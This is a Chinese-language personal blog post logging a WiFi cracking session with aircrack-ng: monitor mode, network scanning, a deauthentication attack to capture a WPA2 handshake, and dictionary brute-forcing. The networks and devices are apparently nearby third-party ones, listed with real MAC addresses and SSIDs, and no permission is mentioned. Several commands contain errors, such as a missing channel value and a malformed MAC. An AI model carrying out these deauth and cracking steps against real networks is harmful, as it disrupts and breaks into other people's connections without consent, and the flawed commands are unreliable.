---
layout: post
title:  "一次wifi破解记录"
categories: Hacker
tags:  wifi hacker
---

* content
{:toc}


## 0x00 前言

wifi破解工具有很多，比如wifite、aircrack、cowpatty、reaver等等，其中wifite是最傻瓜式的，但是个人尝试很久，没有破解成功一次，我就很好奇，是我的方式不对？cowpatty只管破解，因此还是要和air结合起来用。reaver破解的非常非常慢，一次要很久，但是一般都能搞定。这次先用aircrack。

## 0x01 准备

装逼要用全套的，特意买的3070的网卡，专用破解。

据说效果很好，但是我完全体会不到......

```
~$ lsusb
Bus 001 Device 014: ID 148f:3070 Ralink Technology, Corp. RT2870/RT3070 Wireless Adapter

~$ iwconfig
wlan1     IEEE 802.11bgn  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=30 dBm
          Retry  long limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on
```

## 0x02 获取握手包

### 1.激活监听模式

```
~$ airmon-ng start wlan1

PHY     Interface       Driver          Chipset
phy1    wlan1           rt2800usb       Ralink Technology, Corp. RT2870/RT3070

                (mac80211 monitor mode vif enabled for [phy1]wlan1 on [phy1]wlan1mon)
                (mac80211 station mode vif disabled for [phy1]wlan1)
                (mac80211 station mode vif disabled for [phy1]wlan1)
```

激活之后就发现名称变了，多了个mon，后面的mode是monitor。

```
~$ /home/dante# iwconfig

wlan1mon  IEEE 802.11bgn  Mode:Monitor  Tx-Power=30 dBm
          Retry  long limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```

### 2. 获取wifi信息
```
airodump-ng wlan0mon
下面就会显示出所有的wifi的链接信息。之前遗漏了这一块，暂时不补了。

```

### 3.抓包

破解的过程就是先抓包，抓到它的四次握手包，然后破解出密码。

```
airodump-ng --ivs -w filename -c wlan1mon
```

```
BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 5C:63:BF:61:8B:C8  -58      639      761    0   6  54e. WPA2 CCMP   PSK  quan
 30:F3:35:87:24:BC  -66      330        0    0   4  54e  WPA2 CCMP   PSK  CU_57w8
 C0:61:18:22:8B:2B  -65      620      547    0   6  54e. WPA2 CCMP   PSK  tunshi6
 64:09:80:4B:FC:2C  -71      223     2184    1   1  54e  WPA2 CCMP   PSK  Xiaomi_tunshi7

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 5C:63:BF:61:8B:C8  A4:C4:94:DB:10:1A  -44    0 - 2e     0      153  quan
 C0:61:18:22:8B:2B  74:2F:68:4A:7B:7B  -84    0e- 1      0      558  tunshi6
 64:09:80:4B:FC:2C  AC:B5:7D:D1:00:62   -1    1e- 0      0      154
 64:09:80:4B:FC:2C  14:F6:5A:B6:E2:94  -80    1e- 1      0     1369  su8-1
 ......
```

### 4.Deauth攻击

现在对脸上路由器64:09:80:4B:FC:2C上的设备64:09:80:4B:FC:2C进行攻击。

```
~$ aireplay-ng -0 10 -a 64:09:80:4B:FC:2C -c 64:09:80:4B:FC:2C4 wlan1mon --ignore-negative-one
13:18:29  Waiting for beacon frame (BSSID: 64:09:80:4B:FC:2C) on channel -1
13:18:30  Sending 64 directed DeAuth. STMAC: [14:F6:5A:B6:E2:94] [ 0| 0 ACKs]
13:18:30  Sending 64 directed DeAuth. STMAC: [14:F6:5A:B6:E2:94] [ 0| 0 ACKs]
13:18:30  Sending 64 directed DeAuth. STMAC: [14:F6:5A:B6:E2:94] [ 0| 0 ACKs]
13:18:31  Sending 64 directed DeAuth. STMAC: [14:F6:5A:B6:E2:94] [ 0| 0 ACKs]
13:18:31  Sending 64 directed DeAuth. STMAC: [14:F6:5A:B6:E2:94] [ 0| 0 ACKs]
13:18:32  Sending 64 directed DeAuth. STMAC: [14:F6:5A:B6:E2:94] [ 0| 0 ACKs]
```
可以看到，当发送攻击的时候，你攻击的那台设备就会丢包。

```
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe
 C0:61:18:22:8B:2B  74:2F:68:4A:7B:7B  -86    0e- 1      0      834  tunshi6
 64:09:80:4B:FC:2C  14:F6:5A:B6:E2:94    0    0e- 1    373     3782  su8-1
```

发送了好几次攻击，过了二十多分钟才获取到握手包。可以看到下面获取到了handshake

```
  CH  4 ][ Elapsed: 25 mins ][ 2016-03-06 13:34 ][ WPA handshake: 64:09:80:4B:FC:2C                                                                
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                                  
 5C:63:BF:61:8B:C8  -58     1973      909    0   6  54e. WPA2 CCMP   PSK  quan
 30:F3:35:87:24:BC  -64     1062        0    0   4  54e  WPA2 CCMP   PSK  CU_57w8
 64:09:80:4B:FC:2C  -73      707     4411    0   1  54e  WPA2 CCMP   PSK  Xiaomi_tunshi7
 ......
```
## 0x03 破解

破解就是用了爆破，完全是看字典！

```
aircrack-ng -w dic.txt test-0*.cap

```
然后选定需要破解的wifi即可开始进行破解。话说，运气不好的时候，打死也破解不出来.......

```
                           Aircrack-ng 1.2 rc3


                   [00:00:31] 12552 keys tested (381.79 k/s)


                       Current passphrase: 123bandit


      Master Key     : E3 A0 4F 08 DC D9 95 A5 87 48 02 B5 E1 93 C6 84
                       75 DD 23 E8 45 65 DD CA B8 89 53 96 75 E8 56 10

      Transient Key  : 11 24 33 3A FE 8F 51 E6 7D 7C C5 C2 BB 9B 0B 6F
                       4F 99 8C 5D 67 2B E2 6A 9C 34 2A 4A FB 1D 19 4F
                       84 C4 4C 8D 58 3B 22 70 C9 36 FD 98 D9 D6 E6 94
                       72 C9 AF 54 E1 B2 83 F1 EF 2A FA 0C 7D 59 3A 96

      EAPOL HMAC     : 80 84 40 03 84 DC E4 20 41 FF 74 C8 FB 1C DE EB
```

## 0xFF 总结

aircrack的确是神器，用好了破解个wifi不是太大问题的，不过也就弱密码比较好搞定一些，有些意识比较强的孩子密码设置的比较神奇，基本也没戏。

不过破解的方式也总是在提高，比如彩虹表、GPU这些各种高效的方式都可以使用，目前爆破能拿来玩一玩，剩余的慢慢研究。

**补充**

其实到头来都是在用工具，对里面的原理还没有太深的理解，下一步多了解一些使用方式后，着重自己动手写一些程序来操作。


******
2016-03-06 19:18:00 hnds
